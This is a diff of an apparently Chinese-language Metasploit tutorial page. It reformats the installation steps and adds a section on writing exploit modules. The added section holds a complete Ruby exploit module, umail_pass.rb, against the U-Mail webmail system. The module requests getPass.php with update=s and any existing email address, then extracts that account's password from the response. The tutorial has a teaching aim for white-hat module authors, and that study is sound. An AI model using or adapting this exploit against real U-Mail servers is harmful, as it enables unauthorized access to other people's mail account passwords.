@@ -58,35 +58,123 @@
 </div>
 <div class="section" id="id3">
 <h2>环境配置<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h2>
-<p>下载程序
-磨刀不误砍柴工，在写模块之前需要搭建好相关环境。如果你是个勤劳的白帽子，我们建议您在*nix系统中完整的安装一次Metasploit，有助于对该框架的多一些了解，不过，熟悉kali的人大都知道系统自身带有现成的环境。Metasploit和Kali Linux的相关下载地址参考如下：
-Metasploit境内官方下载地址：<a class="reference external" href="http://www.metasploit.cn/thread-3-1-1.html">http://www.metasploit.cn/thread-3-1-1.html</a>
-Metaspoit境外官方下载地址：
-&#8211;Metasploit for Linux 64-bit:
-Kali Linux境内官方下载地址：
-Kali Linux境外官方下载地址：<a class="reference external" href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a></p>
-<p>安装程序
-Metasploit因存在windows和linux两个版本，windows下的安装方式较为常规，此处只介绍在linux系统下的安装方法。
-a、添加执行权限
-64位：chmod +x /path/to/metasploit-latest-linux-x64-installer.run
-32位：chmod +x /path/to/metasploit-latest-linux-installer.run</p>
-<p>b、以root权限运行安装程序
-64位：sudo /path/to/metasploit-latest-linux-x64-installer.run
-32位：sudo /path/to/metasploit-latest-linux-installer.run</p>
+<p><strong>1. 下载程序</strong></p>
+<p>磨刀不误砍柴工，在写模块之前需要搭建好相关环境。如果你是个勤劳的白帽子，我们建议您在*nix系统中完整的安装一次Metasploit，有助于对该框架的多一些了解，不过，熟悉kali的人大都知道系统自身带有现成的环境。Metasploit和Kali Linux的相关下载地址参考如下：</p>
+<ul class="simple">
+<li><a class="reference external" href="http://www.metasploit.cn/thread-3-1-1.html">Metasploit境内官方下载</a></li>
+<li><a class="reference external" href="http://">Metasploit境外官方下载</a></li>
+<li><a class="reference external" href="http://">Kali Linux境内官方下载</a></li>
+<li><a class="reference external" href="https://www.kali.org/downloads/">Kali Linux境外官方下载</a></li>
+</ul>
+<p><strong>2. 安装程序</strong></p>
+<p>Metasploit因存在windows和linux两个版本，windows下的安装方式较为常规，此处只介绍在linux系统下的安装方法。</p>
+<p>a、添加执行权限</p>
+<p>64位:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">latest</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x64</span><span class="o">-</span><span class="n">installer</span><span class="o">.</span><span class="n">run</span>
+</pre></div>
+</div>
+<p>32位:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">latest</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">installer</span><span class="o">.</span><span class="n">run</span>
+</pre></div>
+</div>
+<p>b、以root权限运行安装程序</p>
+<p>64位:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">sudo</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">latest</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x64</span><span class="o">-</span><span class="n">installer</span><span class="o">.</span><span class="n">run</span>
+</pre></div>
+</div>
+<p>32位:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">sudo</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">latest</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">installer</span><span class="o">.</span><span class="n">run</span>
+</pre></div>
+</div>
 <p>c、在出现Metasploit的安装窗口之后，均按默认选项执行并单击‘Forward’即可完成安装。</p>
-<p>注：编写Metaplosit模块所使用的语言是ruby， Metasploit和Kali Linux在安装完成后均包含了需要的ruby环境，用户可以直接进行相关操作，至于IDE以及Metasploit的两个不同平台的版本选择，此处不做推荐，可以根据自身熟悉情况而定。</p>
-<p>相关目录
-进入Metasploit的目录
-cd /opt/metasploit/apps/pro/msf3/modules/exploits</p>
-<p>注：该目录存放的主要是漏洞验证相关的模块，用户所写的相关漏洞验证模块均存放在此目录下，感兴趣的白帽子也可以写一些工具性的模块，工具性的模块主要存放在/opt/metasploit/apps/pro/msf3/modules/auxiliary目录中，但类似这些模块均不在此文档中做说明，用户可自行研究。</p>
+<div class="admonition note">
+<p class="first admonition-title">注解</p>
+<p class="last">编写Metaplosit模块所使用的语言是ruby， Metasploit和Kali Linux在安装完成后均包含了需要的ruby环境，用户可以直接进行相关操作，至于IDE以及Metasploit的两个不同平台的版本选择，此处不做推荐，可以根据自身熟悉情况而定。</p>
 </div>
-<div class="section" id="id4">
-<h2>编写模块<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h2>
-<p>编写规范</p>
-<p>参考如下：<a class="reference external" href="https://ruby-china.org/wiki/coding-style">https://ruby-china.org/wiki/coding-style</a></p>
+<p><strong>3. 相关目录</strong></p>
+<p>进入Metasploit的目录:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">metasploit</span><span class="o">/</span><span class="n">apps</span><span class="o">/</span><span class="n">pro</span><span class="o">/</span><span class="n">msf3</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">exploits</span>
+</pre></div>
 </div>
-<div class="section" id="id5">
-<h2>常见问题<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h2>
+<div class="admonition note">
+<p class="first admonition-title">注解</p>
+<p class="last">该目录存放的主要是漏洞验证相关的模块，用户所写的相关漏洞验证模块均存放在此目录下，感兴趣的白帽子也可以写一些工具性的模块，工具性的模块主要存放在/opt/metasploit/apps/pro/msf3/modules/auxiliary目录中，但类似这些模块均不在此文档中做说明，用户可自行研究。</p>
+</div>
+</div>
+<div class="section" id="id6">
+<h2>编写模块<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h2>
+<p><strong>1. 编写规范</strong></p>
+<p>参考如下:</p>
+<blockquote>
+<div><a class="reference external" href="https://ruby-china.org/wiki/coding-style">https://ruby-china.org/wiki/coding-style</a></div></blockquote>
+<p><strong>2. 示例参考</strong></p>
+<p>以乌云上的漏洞来源为例子：<a class="reference external" href="http://www.wooyun.org/bugs/wooyun-2010">http://www.wooyun.org/bugs/wooyun-2010</a>-061894（用户在写模块时，可自行从网上搜索漏洞）</p>
+<p>U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，指定为一个已存在的邮箱账号即可查看任意账户密码。</p>
+<p>新建一个新的利用模块umail_pass.rb</p>
+<div class="highlight-python"><div class="highlight"><pre>cd /opt/metasploit/apps/pro/msf3/modules/exploits
+vi umail_pass.rb
+</pre></div>
+</div>
+<p>示例代码如下:</p>
+<div class="highlight-python"><div class="highlight"><pre>#encoding:utf-8
+require &#39;msf/core&#39;
+class Metasploit3 &lt; Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+        &#39;Name&#39;           =&gt; &quot;U-Mail System Unauthorized Access Vulnerability&quot;,
+        &#39;Description&#39;    =&gt; %q{
+          　　U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，当updata参数的值为s，只需将email参数的值指定为一个已存在的邮箱账号即可查看任意账户密码。
+        },
+        &#39;License&#39;        =&gt; MSF_LICENSE,
+        &#39;Author&#39;         =&gt;
+          [
+          &#39;Rain&#39;    #Metasploit-CNNS
+        ],
+        &#39;Platform&#39;        =&gt; [ &#39;php&#39; ],
+        &#39;Arch&#39;           =&gt; ARCH_PHP,
+        &#39;Targets&#39;        =&gt;[[ &#39;U-Mail&#39;, { }]],
+        &#39;Privileged&#39;     =&gt; false,
+        &#39;DisclosureDate&#39; =&gt; &quot;Apr 11 2011&quot;,
+        &#39;DefaultTarget&#39;  =&gt; 0))
+    register_options(
+      [
+        OptString.new(&#39;RHOST&#39;, [true, &#39;The DOMAIN&#39;, &#39;&#39;]),
+        OptString.new(&#39;RPORT&#39;, [true, &#39;The port&#39;, &#39;80&#39;]),
+        OptString.new(&#39;TARGETURI&#39;, [true, &#39;The base path to U-Mail&#39;, &#39;/webmail/&#39;]),
+        OptString.new(&#39;EMAIL&#39;, [true, &#39;The email to U-Mail&#39;, &#39;&#39;]),
+      ], self.class)
+  end
+
+  def exploit
+    begin
+        res = send_request_cgi( {
+            &#39;method&#39; =&gt; &quot;GET&quot;,
+            &#39;uri&#39;    =&gt; normalize_uri(datastore[&#39;TARGETURI&#39;]) + &quot;/getPass.php?update=s&amp;email=#{datastore[&#39;EMAIL&#39;]}&quot;
+          }, 20)
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    rescue ::Timeout::Error, ::Errno::EPIPE
+    end
+      body_data = res.body.force_encoding(&#39;UTF-8&#39;)
+      if body_data =~ /你的密码是/
+        data = body_data.scan(/你的密码是\&lt;\/p\&gt;\&lt;p\&gt;\&lt;center\&gt;\&lt;font color=red\&gt;(.*?)\&lt;\/font\&gt;/)
+        if data and data.first and data.first.first
+          print_good(&quot;---------账号--------\n邮箱 = #{datastore[&#39;EMAIL&#39;]}, 密码 = #{data.first.first}&quot;, &quot;good&quot;)
+        else
+          print_error(&quot;漏洞利用失败！&quot;)
+        end
+      else
+        print_error(&quot;漏洞利用失败！&quot;)
+      end
+  end
+end
+</pre></div>
+</div>
+</div>
+<div class="section" id="id7">
+<h2>常见问题<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h2>
 </div>
 </div>
 
@@ -101,8 +189,8 @@ cd /opt/metasploit/apps/pro/msf3/modules/exploits</p>
 <li><a class="reference internal" href="#">快速入门</a><ul>
 <li><a class="reference internal" href="#id2">简介</a></li>
 <li><a class="reference internal" href="#id3">环境配置</a></li>
-<li><a class="reference internal" href="#id4">编写模块</a></li>
-<li><a class="reference internal" href="#id5">常见问题</a></li>
+<li><a class="reference internal" href="#id6">编写模块</a></li>
+<li><a class="reference internal" href="#id7">常见问题</a></li>
 </ul>
 </li>
 </ul>
